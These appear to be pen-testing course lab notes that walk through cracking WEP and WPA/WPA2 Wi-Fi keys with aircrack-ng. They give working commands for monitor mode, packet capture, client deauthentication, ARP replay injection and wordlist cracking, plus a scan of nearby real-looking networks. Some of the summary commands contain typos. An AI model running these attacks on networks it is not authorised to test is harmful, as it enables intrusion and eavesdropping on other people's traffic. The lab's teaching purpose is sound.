# Lab 10: Cracking Wireless Passwords

___

Wireless networks are ubigutious and understanding some of their weaknesses and how to attack them is a vital skill for modern pen testers.   
In this lab we’ll look at how simple it really is to break WEP and join a WLAN, or sniff traffic on the that network.

in the last section of these notes you’ll see a flowchart highlighting each of the steps needed along the way. For this lab we’ll be using the our the aircrack suite of tools on our Kali
Linux distribution, although many other alternatives wireless cracking tools also exists. 

In this lab we will:
1. Connecting your wireless adapter to your kali vm
2. Putting your wireless card in monitor mode
3. Scanning and capturing local wireless traffic
4. Cracking WEP Networks
5. Cracking WPA/WPA2 Networks
6. Summary commands

___


### 10.1 Connecting your wireless adapter to your kali vm

One of the issues you might have, is whether or not your wireless card is supported, if is not there isn’t much you can do, but assuming your card is supported lets look at how we can connect it to our kali VM's through Virtualbox. 

1. If you havent already installed it make sure you have the Virtualbox extension pack installed for your version of Virtualbox.
2. Make sure you have your kali VM powered off
3. In Virtualbox select our kali VM and right click and select settings
4. Go to USB tab, ensure 'Enable USB controller' is clicked.
5. Choose the USB version you want to use (usb 3 for newer wifi cards, usb 2 for max compatibility)
6. Click on the small usb icon with the plus on it (right hand side) and pick your usb device you want to connect. (Make sure you have your adapter plugged in)
7. Start your kali VM, your device should be added. To check open a terminal and type ifconfig and you should see a wlan0 interface.

> if you don't see the wlan0 interface, your wireless adapter likely needs drivers to be installed. Check your device webpage and look for drivers...
> Driver setup for small alfa adapter:Alfa Network Alfa USB Adapter AWUS036ACS https://www.youtube.com/watch?v=qQZrM_AoJrY&t=67s

___

### 10.2 Putting your wireless card in monitor mode

Next you will need to put the card into monitor mode on the desired channel, using airmon-ng. airmon-ng is a handy utility for checking interface availability and setting
cards to monitor mode on specific channels. It is included as part of the aircrack-ng suite. 

Once you can see your wireless adapter as a network interface, likely wlan0, our next step is to put the card into monitor mode so it can do packet inspection and injection. We'll be using the aircrack-ng suite of tools. 

kills any processes that might interfere with our aircrack tools. (This will likely kill some internet / dhcp services, if you need them back, it easiest to just restart the VM)
```$ airmon-ng check kill ```  

Put our card into monitor mode. This should create a new virtual interface called wlan0mon. 

```
$ sudo airmon-ng start wlan0
PHY	Interface	Driver		Chipset

phy0	wlan0		ath9k_htc	Qualcomm Atheros Communications AR9271 802.11n
(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
```

> Sometimes the virtual interface might be called something else, check the command output to see what your new virtual interface is called, as we'll be using it going forward. It call often still be called wlan0

> For all future commands we will use the virtual interface we've just created so make sure to record it.

by default our card will jump across all channels, if we know the channel we are connecting too then telling your card to only use that channel for be more efficient. So to start our card on channel 7.
``` $ sudo airmon-ng start wlan0 7 ```

___

### 10.3 Scanning and capturing local wireless traffic

We now want to view all the wireless networks and find the network we want to attack. This is normally visible to us, and we can use a program such as airodump-ng to view the details.
airodump-ng is an 802.11 packet capture program that is designed to "capture as much encrypted traffic as possible

```
┌──(alpha㉿chaos)-[~]
└─$ sudo airodump-ng wlan0mon


 CH  8 ][ Elapsed: 1 min ][ 2025-04-07 08:29 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 0C:67:14:78:78:81   -1        0        0    0   2   -1                    <length:  0>                                                 
 10:2C:B1:5B:8B:15   -1        0       33    0   6   -1   WPA              <length:  0>                                                 
 10:2C:B1:C3:2D:A2  -81        4        0    0  11  130   WPA2 CCMP   PSK  <length:  0>                                                 
 9C:31:C3:D5:E4:4A  -89        2        3    0  11  540   WPA2 CCMP   PSK  SKYTNJUR                                                     
 B0:5B:99:41:16:84   -1        0        2    0   6   -1   WPA              <length:  0>                                                 
 A2:2D:13:74:B5:74  -89       20        2    0   6  130   WEP  CCMP   PSK  Vodafone-Guest                                               
 A0:2D:13:74:B5:71  -93       22       11    0   6  130   WPA2 CCMP   PSK  VODAFONE-AAF2                                                
 70:49:A2:B9:49:91  -50       89        0    0   4  130   WPA3 CCMP   SAE  Three_4991                                                   
 A8:42:A1:64:E2:8E  -101        7        0    0   2  270   WPA2 CCMP   PSK  SKYTNJUR5_2.4GEXT                                           
 FA:8F:CA:3D:0B:CF  -63       33        0    0   6   65   OPN              Kitchen speaker.k,                                           
 8C:85:80:FB:2B:90  -60      120        4    0   6  130   WPA2 CCMP   PSK  <length:  0>                                                 
 68:F0:D0:01:94:D8  -90        4        0    0   1   54e  OPN              Skybell_A1BB717712                                           
 B6:F2:27:1A:0E:90  -86       22        0    0   1  130   WPA2 CCMP   MGT  Horizon Wi-Free                                              
 B4:F2:67:1A:0E:90  -87       25       11    0   1  130   WPA2 CCMP   PSK  Tinternet 2.4                                                
 EC:08:6B:4D:84:29  -86       12        0    0  11  405   WPA2 CCMP   PSK  TP-Link QH2                                                  
 D4:DA:CD:05:C1:F4  -63       44       17    0  11  130   WPA2 CCMP   PSK  SKYXYV8D                                                     
 00:A3:88:FD:FA:DA  -57       51       14    0  11  260   WPA2 CCMP   PSK  SKYXYV8D                                                     

Quitting...

```

airodump usage:
airodump-ng [interface] [output file prefix] [channel no.] [essid] [bssid] [IVs flag]
- The [channel no.] can be set to a single channel (1 thru 14) or set to 0 to hop between all channels
- The [IVs flag] can be set to 1 to only save the captured IVs

```
┌──(alpha㉿chaos)-[~]
└─$ sudo airodump-ng wlan0mon --channel 6 --essid Vodafone-Guest --write capturefile
```

At this stage we are capturing traffic from our targeted network. Depending on the type of encryption we're trying to break we need to wait for one of two things. If we're on a very old WEP network then we just need to capture as many data packets/IVs as possible. If we're on a WPA/WPA2 network we just need to capture a handshake.

> in the top right of the airodump-ng capture screen it will highlight when it's captured a handshake.

> we normally want to keep our airodump-ng running until we've captured enough data, so leave it running and open a new tab for the remaining commands.


___

### 10.4 Cracking WEP Networks

For wep networks we need data... the more the better...

How we do this depends on whether we want to be passive or active, as a passive attacker we could sit quietly, waiting to capture enough IV to enable us to try break the
key, or if we wanted to be less patient we could become more active and force more packets to be sent by injecting arp requests onto the network. The issue is the network may not have heavy usage which would mean we’d have to wait to capture enough packets, by injecting extra packets it speeds up the process. So how do we do this?

This injection procedure is required when there is not enough encrypted traffic being passed across the WLAN to break the WEP key. This process involves:
- DE authenticating a valid client (to increase the chances of acquiring an ARP packet, this also allowed us to determine the hidden ESSID.
- Capture and replay of a valid ARP packet to speedup/generate the collection of encrypted packets.

Open another console and initiate a broadcast deauth:
```
$ aireplay-ng -0 10 -a AccessPoint -c Client [interface]
```

Now to produce encrypted packets by collecting and replaying ARP packets:
```$ aireplay-ng -3 -b AccessPoint -h Client [interface]```

We now start listening for ARP requests with the -3 option. The -h option is mandatory and has to be the MAC address of an associated client.

> ⚠️ For the practical exam DE-Authenticating and packet injection are strictly not permitted. You'll loose all wireless marks!!!

With our airodump-ng capturing packs in the background we can now attempt to break the WEP key for our target network. Todo this we use the follwing commands.

```
$ aircrack-ng capturefile01.cap
```

> Our airodump-ng tool will produce several output files, we want to use the .cap file, it also usually adds a number to the end of our file name, so make sure you're using the correct file.

Aircrack-ng will likely say it couldn't find the key and will try again once more IV's have ben captured.. we don't need todo anything just leave the airodump-ng and aircrack-ng commands running and they will keep rechecking and eventually spit out the WEP key. Just sit back and wait.


___

### 10.5 Cracking WPA/WPA2 Networks

Cracking WPA/WPA2 requires us to capture a handshake and doesn't usually care about the number of IV's or packets. Once we've captured a handshake we can try crack the password. The coomand is simialr to WEP except this time we must give a wordlist.

```
$ aircrack-ng capturefile01.cap -w rockyou.txt
```

Again if the passphase is in our wordlist then it will crack it for us and print our the passphase.



6. Summary commands

I’ve summarised all the commands below.
```
# start card in monitor mode 
$ airmon-ng start wlan0

# View networks
$ airodump-ng wlan0mon

# Save packets
airodump-ng --channel 1 wlan0mon --essid NetworkName –write filename

# Detect and replay arp packets
$ aireplay-ng --arpreply –e SSID wlan0mon

# Disconnect client
$ aireplay-ng --deauth 0 -e ssid wlan0mon

# If we need to use a fake MAC
$ airelay-ng --arpreplay –e ssid –h 00:00:00:00:00:00:00 wlan0mon

# Start aircrack for wep
$ aircrack-ng filename.cap

# Start aircrack for WPA/WPA
$ aircrack-ng filename.cap -w wordlist
```

